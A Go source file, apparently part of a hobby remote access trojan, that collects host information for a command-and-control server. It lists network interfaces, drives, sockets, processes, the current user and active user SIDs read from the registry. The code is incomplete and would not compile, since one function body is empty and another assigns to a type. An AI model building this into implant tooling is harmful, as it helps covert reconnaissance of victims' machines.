/*/
This file contains the code for gathering host intelligence
	-uses code from the following sources of open source information
		https://github.com/bluesentinelsec/OffensiveGoLang/
	Please support thier efforts engaging with them (not like that you doofus)
	More community support == More Success for everyone

	BY DEFAULT, THIS FILE ONLY DOES THINGS NOISY AS ALL HELL
	IF YOU WANT NINJA CODE, YOU NEED TO CODE THAT BEHAVIOR IN!
/*/

package shared_code

// import the libraries we need
import (
	"io"
	"log"
	"net"
	"os/user"
	"strconv"

	// necessary for gathering process information
	"github.com/shirou/gopsutil/process"
	// necessary for getting netowork information
	"github.com/cakturk/go-netstat/netstat"
	// Software information Enumeration
	"golang.org/x/sys/windows/registry"
	// Disk information
	"github.com/shirou/gopsutil/disk"
)

/*
Function to gather information about the host
the rat is in residence on, This is the MAIN function
That calls the others depending on the request from the
Command and Control binary
*/
func gather_intel(intel_struct HostIntel) (HostIntel, error) {

}
func get_interfaces(intel_struct HostIntel) {
	// Get all network interfaces
	iface, _ := net.Interfaces()
	HostIntel.Interfaces = iface
}

// code from:
//https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/hardrives.go

// GetDrives iterates through the alphabet to return a list of mounted drives
func GetDrives() ([]disk.PartitionStat, error) {
	partitions, err := disk.Partitions(true)
	if err != nil {
		return nil, err
	}
	return partitions, err
}

// ToDo: add functions for IPv6 connections

// GetTCPConnections returns a slice describing TCP connections
func GetTCPConnections() ([]netstat.SockTabEntry, error) {

	// TCP sockets
	socks, err := netstat.TCPSocks(netstat.NoopFilter)
	if err != nil {
		return nil, err
	}
	return socks, err
}

// GetUDPConnections returns a slice describing UDP connections
func GetUDPConnections() ([]netstat.SockTabEntry, error) {
	// UDP sockets
	socks, err := netstat.UDPSocks(netstat.NoopFilter)
	if err != nil {
		return nil, err
	}
	return socks, err
}

// Procs returns a slice of process objects
// Look at "PrintProcSummary()" and "PrintProcDetails()" for examples on displaying the process info
func Procs() ([][]string, error) {
	procs, err := process.Processes()
	if err != nil {
		return nil, err
	}
	processes := make([][]string, 0)
	for _, ps := range procs {
		// assign each process value to a variable
		i := ps.Pid
		pid := strconv.Itoa(int(i))

		i, _ = ps.Ppid()
		pPid := strconv.Itoa(int(i))

		pName, _ := ps.Name()
		pCmdLine, _ := ps.Cmdline()

		//pCreate, _ := ps.CreateTime()

		pUser, err := ps.Username()
		if err != nil {
			pUser = "Access Denied"
		}

		p := make([]string, 0)
		p = append(p, pid, pPid, pName, pCmdLine, pUser)

		// append each process, p, to the processes slice
		processes = append(processes, p)
	}
	return processes, nil
}

// CurrentUser returns the current user
func CurrentUser() ([]map[string]string, error) {
	u, err := user.Current()
	if err != nil {
		return nil, err
	}

	a := make(map[string]string)
	a["Username: "] = u.Username
	a["SID: "] = u.Uid
	a["Home Directory: "] = u.HomeDir

	userInfo := make([]map[string]string, 0)
	userInfo = append(userInfo, a)

	return userInfo, err
}

// ActiveUsers returns
func ActiveUsers() []*user.User {
	// query registry key, "HKEY_USERS", to get list of security IDs (SIDs)
	sids := queryRegistrySIDs()

	// parse list of SIDs, looking for those that are 46 characters long, indicating active user accounts
	activeUserSids := parseSIDs(sids)

	// lookup user information for each SID
	activeAccounts := lookupUserAccount(activeUserSids)

	return activeAccounts

}

func queryRegistrySIDs() []string {
	// open registry key, "HKEY_USERS"
	k, err := registry.OpenKey(registry.USERS, "", registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	// Read HKEY_USERS subkeys to get user SIDs
	userSIDs, err := k.ReadSubKeyNames(1024)
	if err != nil {
		if err != io.EOF {
			log.Fatal(err)
		}
	}
	return userSIDs
}

func parseSIDs(sids []string) []string {
	activeUserSIDs := make([]string, 0)
	for _, sid := range sids {
		if len(sid) == 46 {
			// append SID
			activeUserSIDs = append(activeUserSIDs, sid)
		}
	}
	return activeUserSIDs
}

func lookupUserAccount(activeUserSids []string) []*user.User {
	activeUsers := make([]*user.User, 0)
	for _, s := range activeUserSids {
		userInfo, _ := user.LookupId(s)
		activeUsers = append(activeUsers, userInfo)
	}
	return activeUsers
}
